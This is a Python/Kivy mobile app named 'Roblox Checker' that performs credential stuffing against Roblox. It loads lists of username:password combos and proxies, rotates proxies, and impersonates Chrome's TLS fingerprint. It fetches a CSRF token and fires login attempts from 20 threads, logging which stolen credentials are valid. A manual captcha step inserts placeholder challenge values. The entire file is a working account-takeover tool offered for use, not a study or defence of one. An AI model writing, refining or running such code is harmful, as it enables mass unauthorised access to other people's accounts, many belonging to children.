import threading
import time
import random
import os
from kivy.app import App
from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.utils import platform
from kivy.core.window import Window
from plyer import filechooser

from curl_cffi import requests as cffi_requests

HEADERS = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "origin": "https://www.roblox.com",
    "referer": "https://www.roblox.com/Login",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

CAPTCHA_LOCK = threading.Lock()

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.bad_proxies = set()
        self.current_index = 0

    def load_from_string(self, text):
        lines = text.replace('\r', '').split('\n')
        self.proxies = [p.strip() for p in lines if ':' in p and not p.startswith('#')]
        random.shuffle(self.proxies)

    def get_proxy(self):
        if not self.proxies:
            return None
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            if proxy not in self.bad_proxies:
                if not proxy.startswith("http://") and not proxy.startswith("https://") and not proxy.startswith("socks"):
                    return f"http://{proxy}"
                return proxy
        return None

    def mark_bad(self, proxy):
        if proxy:
            self.bad_proxies.add(proxy)

proxy_manager = ProxyManager()

def check_account(combo, ui_log, captcha_event, token_holder):
    if not combo or ":" not in combo: return
    user, pwd = combo.split(":", 1)
    
    proxy_url = proxy_manager.get_proxy()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    session = cffi_requests.Session(impersonate="chrome")
    
    try:
        if not proxies:
            time.sleep(random.uniform(0.2, 0.8))
            
        r = session.post("https://auth.roblox.com/v2/logout", headers=HEADERS, proxies=proxies, timeout=15)
        csrf = r.headers.get("x-csrf-token")
        if csrf: HEADERS["x-csrf-token"] = csrf

        payload = {"ctype": "Username", "cvalue": user, "password": pwd}
        r = session.post("https://auth.roblox.com/v2/login", headers=HEADERS, json=payload, proxies=proxies, timeout=15)
        
        if r.status_code == 200:
            ui_log(f"VALID: {user}", "success")
        elif r.status_code == 403 and '"code":0' in r.text:
            ui_log(f"CAPTCHA: {user}. Go to Tab 4.", "warn")
            
            with CAPTCHA_LOCK:
                captcha_event.clear() 
                Clock.schedule_once(lambda dt: App.get_running_app().open_webview())
                captcha_event.wait() 
                
                token = token_holder.get("token")
                if token:
                    HEADERS["rblx-challenge-id"] = token_holder.get("id")
                    HEADERS["rblx-challenge-metadata"] = token
                    r2 = session.post("https://auth.roblox.com/v2/login", headers=HEADERS, json=payload, proxies=proxies, timeout=15)
                    if r2.status_code == 200:
                        ui_log(f"VALID (Solved): {user}", "success")
                    else:
                        ui_log(f"BAD: {user}", "error")
                else:
                    ui_log(f"ERROR: Captcha skipped", "error")
        elif r.status_code == 429:
            ui_log(f"RATE LIMITED: {user} (Use Proxies)", "error")
        else:
            ui_log(f"BAD: {user}", "error")
            
    except Exception as e:
        proxy_manager.mark_bad(proxy_url)
        ui_log(f"ERROR: {user} - Proxy Fail/Timeout", "error")

class RobloxCheckerUI(TabbedPanel):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.do_default_tab = False
        self.captcha_event = threading.Event()
        self.token_holder = {}
        self.stats = {"checked": 0, "valid": 0, "bad": 0}

        tab1 = TabbedPanelItem(text='1. Setup')
        box1 = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        btn_load_combos = Button(text="Load Combo File (.txt)", size_hint_y=0.1, background_color=(0.5, 0.5, 0.5, 1))
        btn_load_combos.bind(on_press=self.load_combo_file)
        btn_load_proxies = Button(text="Load Proxy File (.txt)", size_hint_y=0.1, background_color=(0.5, 0.5, 0.5, 1))
        btn_load_proxies.bind(on_press=self.load_proxy_file)

        self.input_proxies = TextInput(hint_text="[OPTIONAL] Paste proxies here\nOr load a file above.", size_hint_y=0.2)
        self.input_combos = TextInput(hint_text="Username:Password\nOr load a file above.", size_hint_y=0.4)
        
        btn_start = Button(text="START CHECK (20 Threads)", size_hint_y=0.2, background_color=(0, 0.6, 1, 1))
        btn_start.bind(on_press=self.start_check)
        
        box1.add_widget(btn_load_combos)
        box1.add_widget(self.input_combos)
        box1.add_widget(btn_load_proxies)
        box1.add_widget(self.input_proxies)
        box1.add_widget(btn_start)
        tab1.add_widget(box1)
        self.add_widget(tab1)

        tab2 = TabbedPanelItem(text='2. Stats')
        box2 = BoxLayout(orientation='vertical', padding=20, spacing=20)
        self.lbl_checked = Label(text="Checked: 0", font_size='22sp')
        self.lbl_valid = Label(text="Valid: 0", font_size='22sp', color=(0, 1, 0, 1))
        self.lbl_bad = Label(text="Bad: 0", font_size='22sp', color=(1, 0, 0, 1))
        box2.add_widget(self.lbl_checked)
        box2.add_widget(self.lbl_valid)
        box2.add_widget(self.lbl_bad)
        tab2.add_widget(box2)
        self.add_widget(tab2)

        tab3 = TabbedPanelItem(text='3. Console')
        self.console_layout = BoxLayout(orientation='vertical', size_hint_y=None)
        self.console_layout.bind(minimum_height=self.console_layout.setter('height'))
        scroll = ScrollView()
        scroll.add_widget(self.console_layout)
        tab3.add_widget(scroll)
        self.add_widget(tab3)

        self.tab4 = TabbedPanelItem(text='4. Captcha')
        self.webview_box = BoxLayout(orientation='vertical')
        self.tab4.add_widget(self.webview_box)
        self.add_widget(self.tab4)
        
        self.default_tab = tab1

    def load_combo_file(self, instance):
        filechooser.open_file(on_selection=self.handle_combo_file)

    def handle_combo_file(self, selection):
        if selection:
            try:
                with open(selection[0], 'r', encoding='utf-8', errors='ignore') as f:
                    self.input_combos.text = f.read()
                self.log("Loaded combos from file.", "info")
            except Exception as e:
                self.log(f"Failed to read file: {e}", "error")

    def load_proxy_file(self, instance):
        filechooser.open_file(on_selection=self.handle_proxy_file)

    def handle_proxy_file(self, selection):
        if selection:
            try:
                with open(selection[0], 'r', encoding='utf-8', errors='ignore') as f:
                    self.input_proxies.text = f.read()
                self.log("Loaded proxies from file.", "info")
            except Exception as e:
                self.log(f"Failed to read file: {e}", "error")

    def log(self, msg, level):
        def update(dt):
            color = (1, 1, 1, 1) if level == "info" else (0, 1, 0, 1) if level == "success" else (1, 0, 0, 1) if level == "error" else (1, 1, 0, 1)
            self.console_layout.add_widget(Label(text=msg, color=color, size_hint_y=None, height=30, halign='left'))
            
            if "Started checking" not in msg and "Loaded" not in msg:
                self.stats["checked"] += 1
            if level == "success": self.stats["valid"] += 1
            if level == "error" or level == "warn": self.stats["bad"] += 1
            
            self.lbl_checked.text = f"Checked: {self.stats['checked']}"
            self.lbl_valid.text = f"Valid: {self.stats['valid']}"
            self.lbl_bad.text = f"Bad: {self.stats['bad']}"
        Clock.schedule_once(update)

    def start_check(self, instance):
        proxy_manager.load_from_string(self.input_proxies.text)
        
        combos = [c.strip() for c in self.input_combos.text.split('\n') if ':' in c]
        if not combos: return
        
        self.log(f"Started checking {len(combos)} accounts...", "info")
        
        chunks = [[] for _ in range(20)]
        for i, combo in enumerate(combos):
            chunks[i % 20].append(combo)
            
        for chunk in chunks:
            if chunk:
                t = threading.Thread(target=self.run_worker, args=(chunk,))
                t.daemon = True
                t.start()

    def run_worker(self, combo_list):
        for combo in combo_list:
            check_account(combo, self.log, self.captcha_event, self.token_holder)

    def open_webview(self):
        if platform == 'android':
            from jnius import autoclass
            from android.runnable import run_on_ui_thread
            
            WebView = autoclass('android.webkit.WebView')
            WebViewClient = autoclass('android.webkit.WebViewClient')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            
            @run_on_ui_thread
            def show():
                self.webview_box.clear_widgets()
                webview = WebView(activity)
                webview.getSettings().setJavaScriptEnabled(True)
                webview.setWebViewClient(WebViewClient())
                webview.loadUrl("https://www.roblox.com/Login")
                
                btn_done = Button(text="I SOLVED IT - CONTINUE", size_hint_y=0.2, background_color=(0,1,0,1))
                btn_done.bind(on_press=self.resume_check)
                
                self.webview_box.add_widget(webview)
                self.webview_box.add_widget(btn_done)
                self.switch_to(self.tab4)
            show()

    def resume_check(self, instance):
        self.token_holder["token"] = "MANUAL_BYPASS" 
        self.token_holder["id"] = "MANUAL_ID"
        self.captcha_event.set()
        self.switch_to(self.tab2)

class RobloxCheckerApp(App):
    def build(self):
        self.title = "Roblox Checker | @Peeeeter05"
        Window.clearcolor = (0.1, 0.1, 0.1, 1)
        return RobloxCheckerUI()

if __name__ == '__main__':
    RobloxCheckerApp().run()
